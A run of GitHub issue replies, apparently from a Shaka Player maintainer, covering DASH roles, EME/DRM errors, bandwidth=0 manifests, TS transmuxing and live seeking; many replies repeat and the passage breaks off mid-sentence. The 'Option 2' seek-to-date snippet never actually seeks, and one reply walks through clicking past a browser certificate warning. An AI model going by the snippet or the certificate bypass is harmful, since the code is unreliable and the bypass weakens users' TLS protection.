Separate from this timeout issue, your feedback on my proposal would be very welcome.  Thanks!. If there are multiple audio tracks with the same language and no role, we have no way to differentiate between them other than by ID.  If they contain different content, they need to be differentiated either by language or role.  Otherwise, the ABR system may choose to adapt between them.\nIf the audio tracks contain different content (such as different languages, or main audio vs commentary, etc), and there is no difference in either the language or role attributes, then this would be bad content.  There would be no way for the ABR system to handle them correctly.. I don't think I understand what you mean when you say \"adapting within the same representation ID\".  Do you mean within the AdaptationSet?\nI was under the impression that there were no \"standard\" set of role values.  The DASH spec has this to say on roles:\nSection 5.3.3 Adaptation Sets\nSection 5.3.3.1 Overview\n\nThe values for the elements Role, Accessibility, Viewpoint and Rating are generally not provided within the scope of this part of ISO/IEC 23009. However, a number of simple schemes are defined in 5.8.5.\n\nSection 5.8.4.2 Role\n\nFor the element Role the @schemeIdUri attribute is used to identify the role scheme employed to identify the role of the media content component. Roles define and describe characteristics and/or structural functions of media content components.\nOne Adaptation Set or one media content component may have assigned multiple roles even within the same scheme.\nThis part of ISO/IEC 23009 defines a simple role scheme in 5.8.5.5.\nIn addition, this part of ISO/IEC 23009 defines other roles schemes to support signalling for multiple view signals in 5.8.5.6.\n\n5.8.5.5, then is where the \"standard\" roles are defined:\nSection 5.8.5.5 DASH role scheme\n\nThe URN \"urn:mpeg:dash:role:2011\" is defined to identify the role scheme defined in Table 22. Note that Role@value shall be assigned to Adaptation Sets that contain a media component type to which this role is associated.\n\nTable 22 then goes on to define \"caption\", \"subtitle\", \"main\", \"alternate\", \"supplementary\", \"commentary\", and \"dub\" roles.\nSo it would seem that there are, in fact, some small set of \"standard\" roles in DASH, but in general, any scheme may be used with any values.  We don't check the scheme, and it wouldn't benefit anyone (as far as I can tell) for Shaka Player to attempt to validate the role values we find in the manifest.  Would we reject a manifest with unrecognized roles?  Ignore those roles?  Would this surprise the app developer, who then has to modify the library to support some new scheme which is explicitly allowed by the spec?\nIn any case, I don't think you should be putting a unique value into the role of each audio AdaptationSet or Representation.  Instead, you should put values with some semantic meaning that makes sense for your application and content.  If you are concerned about the introduction of new values, you could use one of the spec'd values from Section 5.8.5.5 Table 22, or you could use a custom schemeIdUri value so that you are free to make up your own roles.\nDoes this make sense?. I see what you mean about AdaptationSets.  In v2.0.x and earlier, we didn't do things in terms of variants.  Instead, we would keep streams (Representations) grouped into stream sets (AdaptationSets) internally.  So you would not switch outside of your AdaptationSet, but I can't recall whether there was a good way to choose an arbitrary one.\nWhen we moved our internal models to variants to support HLS, we essentially mapped DASH onto HLS.  (Going the opposite direction was not feasible.)  The loss of AdaptationSet information was a consequence of that, but we were not aware of any use cases where this would be a problem.\nI'd love to discuss this further and try to better understand your situation and how we can better meet your needs.  In the mean time, is the use of numbered roles sufficient for your purposes as a workaround?. I'm adding this to the backlog and labeling enhancement so we don't lose track of it.  I need to spend some time considering what exactly we would change, if anything.  I haven't had time to dig in yet.. The fix has been cherry-picked for v2.1.6.. We don't currently provide a UI layer in the library, so you are already completely in control of styling and branding.  You can overlay things on top of the <video> element, as we do in our demo, and style them with CSS.  To turn off the browser's built-in video controls overlay, set video.controls to false in JavaScript or remove the controls attribute from the <video> element.\nPlay speed control is done through the HTML5 video API video.playbackRate.  Just set it to whatever you like.  If it goes into a buffering state, Shaka Player will set playbackRate to 0, then set it back to the your setting when playback resumes.\nDoes this answer your question?. If you look up the docs for error code 6001, you'll see this:\n\nNone of the requested key system configurations are available. This may happen under the following conditions:\n - The key system is not supported.\n - The key system does not support the features requested (e.g. persistent state).\n - A user prompt was shown and the user denied access.\n - The key system is not available from unsecure contexts. (ie. requires HTTPS) See https://goo.gl/EEhZqT.\n\nThis last point is probably the one affecting you.\nIn the nightly build, we have added a section to the DRM config tutorial called \"EME and http URLs\", which says this:\n\nEME requires a secure URL to use.  This means you have to use https or be on localhost.  Currently only Chrome enforces it, but other browsers will in the future.  Also, because of mixed content requirements, if your site is using https, then your manifest and every segment will also need to use https too.\nSee: Chrome's announcement, Firefox's intent to remove, and how to disable for testing.\n\nI think this should be called out more explicitly at the top of each DRM-related tutorial.  Would this help?. I moved some things around in the docs to make this more clear.  The changes to the docs have been cherry-picked and will be released in v2.1.5.  Please let me know if this helps.. Glad we could help!. The fix has been cherry-picked for v2.1.6.. Hi @cmolinaAlicante,\nInstead of manipulating the manifest, you should use the playRangeStart and playRangeEnd configuration to limit the playback range.  These settings are not in v2.1.x releases, but are available in the master branch and will be released with v2.2.0.\nDoes this help?. Ah, I see.  I misunderstood your goal.\nYou can definitely trim periods.  You don't need to manipulate the segment references at all.  If the period duration is shorter, the content will be trimmed for you by MediaSource.\nIn your example, the period duration is set to 15s.  You said you wanted time 4 - 10 from the original, so the period duration should be 6s.  Further, if you need to offset the content from time 4 back to 0, you will need to use the presentationTimeOffset attribute.\nDoes this help?. Try dropping any segments which begin after the period ends.  Or modify the parser to drop them for you instead of asserting.. @cmolinaAlicante, did this help at all?. Closing due to inactivity.  Please let us know if you need anything else.. You may also need to change your Widevine license policy.  Check the license duration and renewal interval.\nFor example, if renewal interval is 100s, and license duration is 110s, a 10s delay would lead to expiration.\nIdeally, you would renew often enough that an occasional delay or failed renewal would not lead to expiration.  For example, a license duration of 5m and a renewal interval of 1m means you could fail several renewal attempts before the license expires.. @lelikg, have you been able to check your policy settings?. Closing due to inactivity.  Please let us know if you need anything else.  If your license server policy settings do not fix the problem, we can reopen and help you investigate.. I don't see any major clock sync issues when I analyze the content, and it does play for me in the demo.. Can you provide any other information?  Are there any additional steps I should take?\nSince your manifest URL is private, I've sent you back a private repro link from the demo app to show what I'm doing.. I analyzed the failing manifest and found that the presentation timeline differs from the segment references by 72454 seconds (a little over 20 hours).  So this appears to be either a clock sync issue or massive drift.\nCan you tell us what encoder/packager you're using?  Have you checked for updated encoder/packager software?\nThe DASH spec allows for segment reference times to be \"approximate\", and goes on to define that as +/- 0.5 segment lengths.  20 hours is obviously much more inaccuracy than is allowed by the spec, so I believe the encoder/packager is at fault.. Happy to help!  Do you mind if we close this bug now, or is there something else we can do to help?. @dobrusev, we have decided to detect and attempt to correct issues like this in the player.  Can you make your stream available to us again for testing?. Thank you!. A static copy of the broken manifest would not be sufficient for me to test my workaround.  I would need to test that I am able to play the content in spite of the manifest being incorrect.\nIf you can't recreate the issue, I will just have to proceed with unit testing and simulation, instead.  Thanks!. The workaround is being reverted.  The timeline correction is actually making things worse in some cases.  Details in the commit message.. The workaround is being reverted.  The timeline correction is actually making things worse in some cases.  Details in the commit message.. Yes, Electron and things like it will work because they are actually complete browsers.\nNode, however, is just a JS environment.  It is better suited for command-line tasks, but does not provide the media-related APIs we use.\nIf your goal is just to get Shaka to parse manifests and request segments, you don't need to do much more than stub out video and MediaSource.  For example, video.play() doesn't have to do anything, and SourceBuffer.appendBuffer only has to invoke an event.\nYou may also be able to repurpose some of the fakes we use in unit tests.  See simple_fakes.js in test/test/util/.. Yes, Electron and things like it will work because they are actually complete browsers.\nNode, however, is just a JS environment.  It is better suited for command-line tasks, but does not provide the media-related APIs we use.\nIf your goal is just to get Shaka to parse manifests and request segments, you don't need to do much more than stub out video and MediaSource.  For example, video.play() doesn't have to do anything, and SourceBuffer.appendBuffer only has to invoke an event.\nYou may also be able to repurpose some of the fakes we use in unit tests.  See simple_fakes.js in test/test/util/.. It seems like this has been solved, at least insofar as we can do anything to solve it from Shaka Player.  If you would like help exploring other options besides headless Chrome or bootstrapping DashParser in node.js, please let us know and we can reopen.  Thanks!. It seems like this has been solved, at least insofar as we can do anything to solve it from Shaka Player.  If you would like help exploring other options besides headless Chrome or bootstrapping DashParser in node.js, please let us know and we can reopen.  Thanks!. Another clone implementation sounds reasonable.  Using JSON.stringify is a giant hack anyway, so I don't mind seeing that go away.. Another clone implementation sounds reasonable.  Using JSON.stringify is a giant hack anyway, so I don't mind seeing that go away.. The fix has been cherry-picked to v2.2.x and will be released in v2.2.2.. The fix has been cherry-picked to v2.2.x and will be released in v2.2.2.. It seems reasonable.  I think we have enough information for this, but a Date object would only be translatable into a presentation time for live content.  It would be meaningless for VOD, as the presentation timeline for VOD is not anchored in any way to date & time.. It seems reasonable.  I think we have enough information for this, but a Date object would only be translatable into a presentation time for live content.  It would be meaningless for VOD, as the presentation timeline for VOD is not anchored in any way to date & time.. For live streams, with no start time specified in player.load(), the playback start time is calculated by Playhead.  Playhead is created in the middle of the Promise chain in load(), and it won't listen to 'seeking' events until 'loadedmetadata' fires.  So any seek you perform before 'loadedmetadata' will essentially be overridden by Playhead during startup.\nplayer.seekRange() should start working as soon as the manifest is parsed, which is earlier than the creation of Playhead.  So by the time Playhead would permit you to seek, you can use seekRange() to decide where to go.  You can also use getPlayheadTimeAsDate() as soon as the manifest is parsed.\nI suggest waiting either until load() is resolved, or until after 'loadedmetadata' is fired.  (Note that I haven't tried any of these suggestions myself, so YMMV.)\n```js\nfunction seekToDate(targetDate) {\n  var playheadDate = player.getPlayheadTimeAsDate();\n  var offsetMilliseconds = targetDate.getTime() - playheadDate.getTime();\n  video.currentTime += offsetMilliseconds / 1000;\n}\n// Option 1, wait for load() to complete\nplayer.load(manifestUri).then(function() {\n  seekToDate(targetDate);\n});\n// Option 2, wait for 'loadedmetadata'\nfunction onLoadedMetadata() {\n  video.removeEventListener('loadedmetadata', onLoadedMetadata);\n}\nvideo.addEventListener('loadedmetadata', onLoadedMetadata);\n```\nDoes this help?. For live streams, with no start time specified in player.load(), the playback start time is calculated by Playhead.  Playhead is created in the middle of the Promise chain in load(), and it won't listen to 'seeking' events until 'loadedmetadata' fires.  So any seek you perform before 'loadedmetadata' will essentially be overridden by Playhead during startup.\nplayer.seekRange() should start working as soon as the manifest is parsed, which is earlier than the creation of Playhead.  So by the time Playhead would permit you to seek, you can use seekRange() to decide where to go.  You can also use getPlayheadTimeAsDate() as soon as the manifest is parsed.\nI suggest waiting either until load() is resolved, or until after 'loadedmetadata' is fired.  (Note that I haven't tried any of these suggestions myself, so YMMV.)\n```js\nfunction seekToDate(targetDate) {\n  var playheadDate = player.getPlayheadTimeAsDate();\n  var offsetMilliseconds = targetDate.getTime() - playheadDate.getTime();\n  video.currentTime += offsetMilliseconds / 1000;\n}\n// Option 1, wait for load() to complete\nplayer.load(manifestUri).then(function() {\n  seekToDate(targetDate);\n});\n// Option 2, wait for 'loadedmetadata'\nfunction onLoadedMetadata() {\n  video.removeEventListener('loadedmetadata', onLoadedMetadata);\n}\nvideo.addEventListener('loadedmetadata', onLoadedMetadata);\n```\nDoes this help?. Hi Christoph,\nFirst, let me explain what Shaka is doing.\nShaka continues to buffer up to the bufferingGoal setting even when paused.  It doesn't check navigator.onLine, either.  We also don't cache anything, so if we fail to fetch a segment, there is no reason that failure should \"stick\".  We should be able to fetch those same segments once the network is back.\nWe don't check navigator.onLine in StreamingEngine because the same streaming logic is used for content that has been stored in a database for offline playback.  If we didn't stream during navigator.onLine == false, offline playback from the database would not be possible.\nI can reproduce your issue with VOD content, but not with live:\nhttps://shaka-player-demo.appspot.com/demo/#asset=//vm2.dashif.org/livesim/utc_head/testpic_2s/Manifest.mpd;lang=en-US\nIt looks like this was introduced in PR #842, which was meant to address issues #830 and #762.  In #830, the complaint was that we kept retrying on VOD even after a failure.  So it sounds like you want exactly the opposite behavior.\n762 was reopened with a discussion about adding a method to ask the player to retry streaming after a failure, but I'm not sure if that's the best way to go or not.\nLet me consider the best way to allow each application to choose the desired behavior, and I'll let you know what we come up with.  Thanks!. Hi Christoph,\nFirst, let me explain what Shaka is doing.\nShaka continues to buffer up to the bufferingGoal setting even when paused.  It doesn't check navigator.onLine, either.  We also don't cache anything, so if we fail to fetch a segment, there is no reason that failure should \"stick\".  We should be able to fetch those same segments once the network is back.\nWe don't check navigator.onLine in StreamingEngine because the same streaming logic is used for content that has been stored in a database for offline playback.  If we didn't stream during navigator.onLine == false, offline playback from the database would not be possible.\nI can reproduce your issue with VOD content, but not with live:\nhttps://shaka-player-demo.appspot.com/demo/#asset=//vm2.dashif.org/livesim/utc_head/testpic_2s/Manifest.mpd;lang=en-US\nIt looks like this was introduced in PR #842, which was meant to address issues #830 and #762.  In #830, the complaint was that we kept retrying on VOD even after a failure.  So it sounds like you want exactly the opposite behavior.\n762 was reopened with a discussion about adding a method to ask the player to retry streaming after a failure, but I'm not sure if that's the best way to go or not.\nLet me consider the best way to allow each application to choose the desired behavior, and I'll let you know what we come up with.  Thanks!. @boredom2, I'm closing this issue and merging it into #960, in which I've proposed a more general solution.  Please provide feedback there.  Thanks!. @boredom2, I'm closing this issue and merging it into #960, in which I've proposed a more general solution.  Please provide feedback there.  Thanks!. The use of the bandwidth attribute in Representation is mandatory in the DASH spec.  So if the attribute is missing, the content is broken.\nFurther, the definition of the attribute in the spec is as follows (section 5.3.5.2, Table 7, \"Semantics of Representation element\"):\n\nConsider a hypothetical constant bitrate channel of bandwidth with the value of this attribute in bits per second (bps). Then, if the Representation is continuously delivered at this bitrate, starting at any SAP that is indicated either by @startWithSAP or by any Segment Index box, a client can be assured of having enough data for continuous playout providing playout begins after @minBufferTime * @bandwidth bits have been received (i.e. at time @minBufferTime after the first bit is received).\n\nIf bandwidth is 0, this formula would state that playback can begin after 0 bits are received.  This is clearly false, and therefore a bandwidth of 0 is clearly nonsensical.\nThat said, we can probably still play back in most cases.  If the combination of audio and video bandwidth is always non-zero and accurate, adaptation should still work, even if one of the two numbers was zero.  And if there is only one combination of audio + video, there are no adaptation choices to be made anyway.\nSo, in circumstances that either the sum of audio+video bandwidth is still accurate or that there is only one audio+video combination, we can make this work for you.. The use of the bandwidth attribute in Representation is mandatory in the DASH spec.  So if the attribute is missing, the content is broken.\nFurther, the definition of the attribute in the spec is as follows (section 5.3.5.2, Table 7, \"Semantics of Representation element\"):\n\nConsider a hypothetical constant bitrate channel of bandwidth with the value of this attribute in bits per second (bps). Then, if the Representation is continuously delivered at this bitrate, starting at any SAP that is indicated either by @startWithSAP or by any Segment Index box, a client can be assured of having enough data for continuous playout providing playout begins after @minBufferTime * @bandwidth bits have been received (i.e. at time @minBufferTime after the first bit is received).\n\nIf bandwidth is 0, this formula would state that playback can begin after 0 bits are received.  This is clearly false, and therefore a bandwidth of 0 is clearly nonsensical.\nThat said, we can probably still play back in most cases.  If the combination of audio and video bandwidth is always non-zero and accurate, adaptation should still work, even if one of the two numbers was zero.  And if there is only one combination of audio + video, there are no adaptation choices to be made anyway.\nSo, in circumstances that either the sum of audio+video bandwidth is still accurate or that there is only one audio+video combination, we can make this work for you.. The work-around has been cherry-picked for v2.1.6.. The work-around has been cherry-picked for v2.1.6.. What browser are you using?. What browser are you using?. Chrome doesn't support MPEG-2-TS, nor does Firefox.  Shaka currently only supports TS content on browsers that have TS support built in.\nWe have two changes coming which should help.\nSince the error UNPLAYABLE_PERIOD does not clearly explain the situation, we will be adding a new error code for cases like yours: CONTENT_NOT_SUPPORTED_BY_BROWSER.  This work is being tracked in #868.\nWe are also working on a solution to transmux TS to MP4 so that we can play TS independent of the browser's TS support.  This is being tracked in #887, and will require an additional library called mux.js.\nDoes this help?. Chrome doesn't support MPEG-2-TS, nor does Firefox.  Shaka currently only supports TS content on browsers that have TS support built in.\nWe have two changes coming which should help.\nSince the error UNPLAYABLE_PERIOD does not clearly explain the situation, we will be adding a new error code for cases like yours: CONTENT_NOT_SUPPORTED_BY_BROWSER.  This work is being tracked in #868.\nWe are also working on a solution to transmux TS to MP4 so that we can play TS independent of the browser's TS support.  This is being tracked in #887, and will require an additional library called mux.js.\nDoes this help?. It's definitely about browser support.  Let me explain.\nBrowsers only support certain media containers (such as mp4, webm, or ts) and certain codecs (such as h264, h265, vp8, vp9, aac, ec3, vorbis, or opus).  For Shaka Player to play content today, it must be supported by the browser.\nSome other players do something called \"transmuxing\".  When content is transmuxed in a web application, the container is parsed in JavaScript and a new container is constructed.  For example, if TS is unsupported by the browser, TS segments can be parsed in JavaScript, the h264/aac codec data can be extracted, and that codec data can be put into a new MP4 container.  After transmuxing to mp4, the player has content that the browser can play.\nAll major desktop browsers today support MP4, but only Safari and Edge support TS.  On all other browsers, TS content can only be played through transmuxing.\nSince your TS content plays on Chrome and Firefox in JWPlayer, it means that JWPlayer is transmuxing.  Shaka Player will be able to transmux content in the near future.  If you'd like to keep track of that work, you should subscribe to #887.  In the mean time, you could always use another player that transmuxes.\nI'm sorry that Shaka Player can't solve your problem yet, but we are working on it and hope to be able to release transmuxing support soon.  Please let me know if there's anything else we can do for you until then.. It's definitely about browser support.  Let me explain.\nBrowsers only support certain media containers (such as mp4, webm, or ts) and certain codecs (such as h264, h265, vp8, vp9, aac, ec3, vorbis, or opus).  For Shaka Player to play content today, it must be supported by the browser.\nSome other players do something called \"transmuxing\".  When content is transmuxed in a web application, the container is parsed in JavaScript and a new container is constructed.  For example, if TS is unsupported by the browser, TS segments can be parsed in JavaScript, the h264/aac codec data can be extracted, and that codec data can be put into a new MP4 container.  After transmuxing to mp4, the player has content that the browser can play.\nAll major desktop browsers today support MP4, but only Safari and Edge support TS.  On all other browsers, TS content can only be played through transmuxing.\nSince your TS content plays on Chrome and Firefox in JWPlayer, it means that JWPlayer is transmuxing.  Shaka Player will be able to transmux content in the near future.  If you'd like to keep track of that work, you should subscribe to #887.  In the mean time, you could always use another player that transmuxes.\nI'm sorry that Shaka Player can't solve your problem yet, but we are working on it and hope to be able to release transmuxing support soon.  Please let me know if there's anything else we can do for you until then.. @JyotirmoyGoswami, is there anything else we can do for you?  Otherwise, I'd like to close this issue.  Thanks!. @JyotirmoyGoswami, is there anything else we can do for you?  Otherwise, I'd like to close this issue.  Thanks!. Closing due to inactivity.  Let us know if you need anything else.. In the MPD you referenced, the video track's bandwidth is 0, and the audio track's bandwidth is 125000.  The content is broken because 0 is not a valid value.  See detailed analysis in https://github.com/google/shaka-player/issues/938#issuecomment-317278180 if you are interested.\nThat said, it plays in v2.0.9, and in #938 I agreed implement a work-around.  Since your content only has one audio+video combination, we should still be able to play it.\nI'm going to mark this as a duplicate of #938, and will close them both with the same work-around.  Thanks!. @lelikg, no, I'm sorry for the confusion.  According to #938, the manifest is broken because the video bandwidth is 0, which is invalid.  A bandwidth of 0 produces nonsensical values according to formulas in the spec.\nI will attempt to make a change in Shaka Player that will allow such content to play in spite of it being out of spec.  I will use the manifest link you provided to validate that change.\nWhat encoder/packager are you using to produce that stream?  I'd like to report the bandwidth=\"0\" issue to them, so that they have an opportunity to fix it on their end, as well.. I filed arut/nginx-rtmp-module#1079.  Thanks!. @lelikg, I am now getting a 404 error on your manifest.  Can you please make it available to me again for testing purposes?  I want to make sure that my workaround is correct for your content.\nIf you don't want to leave it up publicly, you can send a new URI to shaka-player-issues@google.com instead.  Thanks!. I saw that the manifest was back up, and I was able to verify that my work-around works with your content.  Thanks!. The fix has been pushed to master, so you can try the player workaround now as well.. The work-around has been cherry-picked for v2.1.6.. @gscragg, it was never intended that you would call installAll() more than once, but I can't think of any reason it shouldn't still be safe.  I'll see if I can fix it.. We've pushed a fix.  Please let us know how it works for you.. The fix has been cherry-picked for v2.1.6.. Good idea!  This should be easy to do.. Seems to be related to the use of duration instead of seekRange.end - seekRange.start in the VOD case.  These are used for live content already.. Note: since this is related to #246, it does not affect the v2.1.x releases.. Absolutely.  Would like to send us a quick PR for this?. I was thinking you could send us a pull request on GitHub.  Would that work for you?  See CONTRIBUTING.md in the sources for specifics.. This has been cherry-picked for v2.1.6.. Thanks!  Would you care to send a PR?. No contribution is too small!. This has been cherry-picked for v2.1.6.. Shaka supports multiple manifest formats, so it must have some way to know which parser to use.  There are three ways it does this:\n\nExplicit manifest parser factory from the app, using opt_manifestParserFactory.  This overrides all else.\nExtension-based detection.  Parsers are registered to common file extensions, which we parse from the URL.  This is preferable to header-based, since it allows us to instantiate the parser without an additional request.\nHeader-based detection.  Parsers are registered to common MIME types, and we must make a HEAD request to get the MIME type.  Then the parser is instantiated, and the parser makes a GET request for the manifest contents.\n\nThe reason we use this order (extension before header) is that manifest parsers are responsible for making their own requests.  The API for parsers works this way because parsers also need to initiate update requests for live manifests on their own schedule.  It was more general to also have them fetch the initial manifest, rather than feed them the initial contents and make them initiate update requests.  It also makes more sense for formats like HLS, where a single fetch is not enough to parse the entire manifest.\nAs for the format, you can definitely use URL parameters, you just need to separate them from the rest of the URL with a question mark.  This is a normal convention for URLs:\nhttp://foo.bar/manifest.mpd?p1=v1;p2=v2\nA URL of that format would still be detected as an MPD.  So you can change this:\nhttp://ad-domain.com/path/to/manifest.mpd;sessionid=etc.ad-domain.com?someParam=someValue/\nTo this (question mark first, semicolons to separate parameters):\nhttp://ad-domain.com/path/to/manifest.mpd?sessionid=etc.ad-domain.com;someParam=someValue/\nOr this (question mark first, ampersands to separate parameters):\nhttp://ad-domain.com/path/to/manifest.mpd?sessionid=etc.ad-domain.com&someParam=someValue/\nBoth semicolon and ampersand are common conventions to separate parameters from each other, but what is most important is that you use a question mark to separate the path from the parameters.. If manifest URLs do not follow normal conventions, we already have two fallbacks for this: content-type headers and an explicit parser factory.  Either of these should work, and the explicit factory doesn't require an extra round trip.\nBecause there are already three ways to determine the manifest type, I'm not inclined to create a fourth through a custom URL parser callback.  In fact, you can, if you wish, do your own URL parsing before calling load(), and use the results of that to determine the right parser factory to specify.  So you don't need additional APIs to do your own URL parsing as part of your business logic.\nIt is also worth noting that we use the closure library's uri parser to parse the URL into its component pieces, so if you believe that our definition of path is too restrictive, I suggest you file an issue and/or PR with that parser directly:\nhttps://github.com/google/closure-library/tree/master/closure/goog/uri\nThanks!. The fix has been backported for v2.1.6.. @bhh1988, I believe this may have been fixed in the refactor in\u00a07e0f469. Would you be willing to retest?. I can confirm that this is still an issue on the v2.1.x branch.  Confirming that was hard and involved a lot of hacks, which led me to file #967 to add roles to the demo app UI.\nI need to determine if backporting that refactor to v2.1.x is feasible.. Backporting is not trivial, because the refactor touched some external interfaces.  We can't change the AbrManager API mid-2.1.x.\nI'm looking into other solutions, including a partial reimplementation.. Fixed for v2.1.7.  Thanks!. I believe this is no longer necessary after the refactor in 7e0f4693.  Would you be willing to retest?. Closing since #948 is now closed as well.  Thanks again!. @mchanton, we can't reproduce your issue from the MPD in your gist without also having access to the segments.  Can you post them somewhere for us to try?. With the content you sent via drive, I am unable to reproduce on Edge 15.  Here's a demo:\nhttps://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/_bugs/github-951/output_dash.mpd;play\nWhat Edge version do you have?  (Check navigator.userAgent and look for Edge/XX.). We intend to support the native controls, as well.  You shouldn't always have to implement your own (although it does give you much more UI and UX freedom to do so).\nLet us try again with native controls.. I can reproduce on Edge with native controls, and I'm well on the way to a fix.. The fix has been cherry-picked for v2.1.7.. @mikesalvia, can you attach a JavaScript debugger to your phone while it is in this failed state?  https://developers.google.com/web/tools/chrome-devtools/remote-debugging/\nIt would be useful to see the logs, as that may provide us with a good clue about what has failed.  Based on the symptom (not populating the list), it is likely a network error or JavaScript exception.. What exception is thrown from requestMediaKeySystemAccess?  I don't see it in any of your screenshots. \n The error console screenshot doesn't show any exceptions or errors.. @mikesalvia, the warning about robustness is generated by Chrome, not by us.  It is unimportant and misleading, and I apologize for the confusion.  (See http://crbug.com/720013 for more info.)\nInside the catch() block of the Promise chain, can you please log arguments[0]?  That will show us what the error was.  If createMediaKeys() throws an exception, that is highly unusual.  Normally, you would fail requestMediaKeySystemAccess instead.\nCan you use Shaka Player v1?  The v1 demo didn't probe like this, and I'd be interested to see if it is the probing itself that is broken or if the failed probe is accurate.  Here's a quick link to v1.6.5 that will attempt to load and play a Widevine-encrypted asset: https://v1-6-5-dot-shaka-player-demo.appspot.com/?asset=//storage.googleapis.com/widevine-demo-media/sintel-4k-widevine/sintel.mpd;dash\nAnd finally, I know this may seem like a dumb question, but are you sure you have Widevine on this device?. @mikesalvia, any feedback?  Can you log arguments[0] in the catch() clause?  Does v1 have the same issue?  Can you confirm that Widevine is present on the device?. No worries!. Sorry, I was unclear.  You're giving me arguments[0] right before createMediaKeys(), which is the MediaKeySystemAccess object.  I meant arguments[0] in the catch() statement right after createMediaKeys() fails.  That would be the error thrown by createMediaKeys().  Thanks!. I admit, I'm stumped.  I can't reproduce this, and all evidence (\"Unsupported keySystem\") points to Widevine being missing or unavailable on your device.. Shaka Player is only able to interact with Widevine through EME.  It seems that the request we're making of EME is correct, and EME is telling us that it can't fulfill the request.\nUnless we can find something wrong with the request, there's nothing else Shaka Player can do to fix it.\nIt does seem strange that requestMediaKeySystemAccess() returns a MediaKeySystemAccess object, but createMediaKeys() fails.  Normally, requestMediaKeySystemAccess() should fail if the key system is unavailable.  If it succeeds, createMediaKeys() should also succeed.  So something is not right here.\nYou may need to file a bug with Chromium to pursue this further.  Please CC me on the bug when you do, and I will try to make sure it gets brought to the attention of the right people in Chrome.. Thank you!  We will follow along on crbug and do what we can to help there.. Closing here since the associated crbug has been closed.  Let us know if we can do anything else to help with this.. This has been cherry-picked for v2.1.6.. This small issue turned out to require a large fix and much internal refactoring.. As @TheModMaker points out, there is nothing Shaka Player can do to trust the bad certificate from video.wmspanel.com.  As an individual user, you can work around it as described above, or by this method:\n\nVisit https://video.wmspanel.com/ in Chrome\nClick the \"ADVANCED\" button on the error screen\nClick \"Proceed to video.wmspanel.com (unsafe)\"\nReturn to the Shaka demo and play the asset\n\nSince the site is not serving the content correctly, we should disable the asset.. This has been cherry-picked for v2.1.6.. Yes, we supported DRM in live streams in v1.6, but we are no longer maintaining v1.  Please consider upgrading to v2:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-upgrade-v1.html. There is no way to get this currently, but it's easy to add.. @aleian84, are you the developer of these sites?  Or a user?. I am unable to access those two premium sites you linked above without a paid account.  If you are responsible for their development, perhaps you could grant me access to help debug.\nUsing our demo, I am unable to reproduce your results.  I find that the v1.5.0 and v1.6.5 demos are both working for me in both Firefox 54 and 55 on Linux:\nhttps://v1-5-0-dot-shaka-player-demo.appspot.com/\nhttps://v1-6-5-dot-shaka-player-demo.appspot.com/\nIf you are the developer of these sites, I would be happy to work with you to resolve the issue.\nIf you are a user, please contact the owners of the sites.  Let them know that they have an issue with Firefox beta 55, and that the Shaka Player team is ready to help if they need it.. Yes, please send credentials to shaka-player-issues@google.com.  The information will remain confidential.. @aleian84, I get playback on Firefox 54, but not Firefox 55.  On both versions of Firefox, I see a successful license request and response.  When I parse the license response, I see both versions received the same keys.\nSo the issue does not seem to be with the license request/response, and the request payload differences seem to be a red herring.\nStill digging.. On both browser versions, I see a key status of 'usable'.  So the CDM has accepted the license response in both cases.  I think we can therefore eliminate the CDM as the root of the issue.. In both versions, I see the video buffer starts at 0.08 and autoplay is set to true.\nIn Firefox 55, while the video is not playing, I see 15 seconds of video buffered.  playbackRate is 1, paused is true.  If I run video.play() in the console, playback starts.\nSo this seems to be a failure of autoplay on Firefox 55.  @cpeterso, this is very easy to reproduce with the credentials and access instructions @aleian84 gave me.  @aleian84, perhaps you could work with @cpeterso to give him access as well?\nThis should probably transition to a Mozilla bug now, but I will leave it to the two of you to start that process.  For now, I'm marking this as \"external bug\" in our tracker.. Done.  Let me know what else I can do.. That may work.  You may also be able to skip detecting Firefox 55 entirely.  Calling video.play() when it is already playing should not hurt anything.\nNote that on some mobile platforms, play() may only be called from a user interaction event, such as a click event.. @jyavenard, Chris copied you on an email a couple hours ago with the credentials and instructions.. Firefox 56 release is currently scheduled for September 26.  We'll keep this open until then, so it is easier for developers to find this issue and avoid filing a duplicate.\nThank you so much for your help!. Firefox 56 is currently stable.  Closing.  Thanks, everyone!. Marking external for now, asking Axinom for assistance debugging.. Axinom reports that IE11 does not support encrypted media with no PSSH box in it.  It would seem that their v7 test vectors omit the PSSH box from the media, and only contain a PSSH in the manifest.. This issue is still around.  The error I get today is still FAILED_TO_GENERATE_LICENSE_REQUEST.. Okay, I'm going to consider that a consensus and move forward with the implementation.  We haven't heard from @bhh1988 or @boredom2 yet, but we'd still love to hear your feedback if you have any.. Yay!  Glad to hear it!. This could be caused by the fact that Player starts initializing MediaSource as soon as it is created.  That way, load() can have a lower latency.\nIn Shaka Player, I believe the best event to show/hide the loading spinner is the 'buffering' event dispatched by Player.  For example:\njs\nplayer.addEventListener('buffering', function(event) {\n  spinner_.style.display = event.buffering ? 'block' : 'none';\n});\nDoes this help?. @dan-ziv, does the buffering event help at all?  Is there anything else we can do for you?. You are correct.  We disable ABR first in the demo app, so the docs are at fault.. The fix has been cherry-picked for v2.1.7.. I'm unable to reproduce with the content you sent via email, or with any of our demo content.\nCan you provide specific steps to reproduce?  (We ask these questions in our issue template to save time.)\nDo you still see the error if you clear your browser cache and reload?. I managed to reproduce this today.  Let me see what I can do to track down the cause.. I am reproducing this with a live stream that is not currently available to the public.  I'm not sure how easily this can be reproduced with other streams.\nOn the surface, the issue is this:  When the demo app gets a callback for the 'trackschanged' event, there are no tracks with .active == true, so activeTrack is undefined and activeTrack.language throws an exception.\nDigging deeper, the event is triggered more than once.\n\nDuring load(), at which time getVariantTracks() returns two tracks, one of which is active.  No exception.\nFrom onChangePeriod_, at which time getVariantTracks() returns two tracks, neither of which is active.  The exception is triggered.\n\nThere is only one period in the manifest, but somehow, our DASH parser creates a second period during the manifest update.  Both periods have .startTime == 0, and both have two variants.  The second period's variants are not active, which makes some kind of sense, because they are not being streamed.\nThe real issue seems to be the creation of a duplicate period on manifest update.. We have a bug in the DASH parser in which we don't add track period IDs for the initial manifest.  This means that during the first update, all periods appear to be new and are duplicated.\nThis was introduced into the master branch in d67764b5ff729cb54f5e7a075e9287e5c92a960e and has not appeared in any releases.. The fix has been pushed to master and we've updated the nightly build early.  Please let us know if this fixed it for you.  Thanks!. From the dash.js code you referenced, it would seem that you want us to avoid buffering more audio than we have already buffered for video.  Is that correct?\nCan you explain the problem a bit more?  Why is it wrong to buffer video 